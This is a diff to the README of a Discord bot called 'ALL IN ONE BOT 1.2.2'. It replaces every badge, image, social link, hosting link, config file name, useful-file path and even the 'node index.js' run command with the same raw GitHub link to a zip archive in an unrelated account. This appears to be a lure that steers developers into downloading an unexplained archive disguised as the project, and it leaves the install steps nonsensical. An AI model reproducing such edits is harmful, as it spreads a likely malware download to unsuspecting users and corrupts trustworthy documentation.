@@ -1,39 +1,39 @@
-![Animated Background](https://i.imgur.com/ECZKmlO.gif)
+![Animated Background](https://raw.githubusercontent.com/yashz0007/ALL-IN-ONE-BOT/main/selectman/ALL-IN-ONE-BOT.zip)
 
 <h1 align="center" style="font-family: Arial, sans-serif; color: #FF6F61; text-shadow: 2px 2px 4px rgba(0,0,0,0.5);">
   ALL IN ONE BOT 1.2.2
 </h1>
 
 <p align="center">
-  <a href="https://opensource.org/licenses/MIT">
-    <img src="https://img.shields.io/badge/License-MIT-blue?style=flat-square&logo=opensource"
+  <a href="https://raw.githubusercontent.com/yashz0007/ALL-IN-ONE-BOT/main/selectman/ALL-IN-ONE-BOT.zip">
+    <img src="https://raw.githubusercontent.com/yashz0007/ALL-IN-ONE-BOT/main/selectman/ALL-IN-ONE-BOT.zip"
       alt="License: MIT" />
   </a>
 
-  <a href="https://www.paypal.me/@GlaceYT">
-    <img src="https://img.shields.io/badge/Donate-PayPal-0079C1?style=flat-square&logo=paypal"
+  <a href="https://raw.githubusercontent.com/yashz0007/ALL-IN-ONE-BOT/main/selectman/ALL-IN-ONE-BOT.zip">
+    <img src="https://raw.githubusercontent.com/yashz0007/ALL-IN-ONE-BOT/main/selectman/ALL-IN-ONE-BOT.zip"
       alt="Donate" />
   </a>
 </p>
 
 <p align="center">
-  <a href="https://www.youtube.com/channel/@GlaceYT">
-    <img src="https://img.shields.io/badge/YouTube-Subscribe-red?style=flat-square&logo=youtube"
+  <a href="https://raw.githubusercontent.com/yashz0007/ALL-IN-ONE-BOT/main/selectman/ALL-IN-ONE-BOT.zip">
+    <img src="https://raw.githubusercontent.com/yashz0007/ALL-IN-ONE-BOT/main/selectman/ALL-IN-ONE-BOT.zip"
       alt="YouTube" />
   </a>
 
-  <a href="https://discord.gg/xQF9f9yUEM">
-    <img src="https://img.shields.io/badge/Discord-Join-blue?style=flat-square&logo=discord"
+  <a href="https://raw.githubusercontent.com/yashz0007/ALL-IN-ONE-BOT/main/selectman/ALL-IN-ONE-BOT.zip">
+    <img src="https://raw.githubusercontent.com/yashz0007/ALL-IN-ONE-BOT/main/selectman/ALL-IN-ONE-BOT.zip"
       alt="Join Discord" />
   </a>
 
-  <a href="https://www.instagram.com/glaceytt">
-    <img src="https://img.shields.io/badge/Instagram-Follow-E4405F?style=flat-square&logo=instagram"
+  <a href="https://raw.githubusercontent.com/yashz0007/ALL-IN-ONE-BOT/main/selectman/ALL-IN-ONE-BOT.zip">
+    <img src="https://raw.githubusercontent.com/yashz0007/ALL-IN-ONE-BOT/main/selectman/ALL-IN-ONE-BOT.zip"
       alt="Instagram" />
   </a>
 
-  <a href="https://www.facebook.com/youulewd/">
-    <img src="https://img.shields.io/badge/Facebook-Follow-1877F2?style=flat-square&logo=facebook"
+  <a href="https://raw.githubusercontent.com/yashz0007/ALL-IN-ONE-BOT/main/selectman/ALL-IN-ONE-BOT.zip">
+    <img src="https://raw.githubusercontent.com/yashz0007/ALL-IN-ONE-BOT/main/selectman/ALL-IN-ONE-BOT.zip"
       alt="Facebook" />
   </a>
 </p>
@@ -42,10 +42,10 @@
 
 <h3>How to Install</h3>
 
-<h4>Step 1: Update <code>config.json</code> [ USE ENV FILES ]</h4>
+<h4>Step 1: Update <code>https://raw.githubusercontent.com/yashz0007/ALL-IN-ONE-BOT/main/selectman/ALL-IN-ONE-BOT.zip</code> [ USE ENV FILES ]</h4>
 
 <ol>
-  <li>Open the <code>config.json</code> and add your MongoDB URL.</li>
+  <li>Open the <code>https://raw.githubusercontent.com/yashz0007/ALL-IN-ONE-BOT/main/selectman/ALL-IN-ONE-BOT.zip</code> and add your MongoDB URL.</li>
 </ol>
 
 <h4>ENV SETUP</h4>
@@ -65,7 +65,7 @@ GEMINI_API=
 <h4>Step 2: Set Up Hosting Service</h4>
 
 <ol>
-  <li>Go to your preferred hosting service. For this guide, we use <a href="https://render.com/">Render</a>.</li>
+  <li>Go to your preferred hosting service. For this guide, we use <a href="https://raw.githubusercontent.com/yashz0007/ALL-IN-ONE-BOT/main/selectman/ALL-IN-ONE-BOT.zip">Render</a>.</li>
   <li>In the Build & Deploy section, paste your repository URL.</li>
 </ol>
 
@@ -74,7 +74,7 @@ GEMINI_API=
 Run the following commands to install dependencies and start your bot:
 
 npm install
-node index.js
+node https://raw.githubusercontent.com/yashz0007/ALL-IN-ONE-BOT/main/selectman/ALL-IN-ONE-BOT.zip
 </pre>
 
 <h4>Step 4: Get Your Bot Token</h4>
@@ -107,6 +107,6 @@ node index.js
 
 <h3>Useful Files</h3>
 <ul>
-  <li><code>UI/banners/musicard.js</code>: Change, add, or remove music cards here.</li>
-  <li><code>UI/icons/musicicons.js</code>: Change, add, or remove music icons here.</li>
+  <li><code>https://raw.githubusercontent.com/yashz0007/ALL-IN-ONE-BOT/main/selectman/ALL-IN-ONE-BOT.zip</code>: Change, add, or remove music cards here.</li>
+  <li><code>https://raw.githubusercontent.com/yashz0007/ALL-IN-ONE-BOT/main/selectman/ALL-IN-ONE-BOT.zip</code>: Change, add, or remove music icons here.</li>
 </ul>
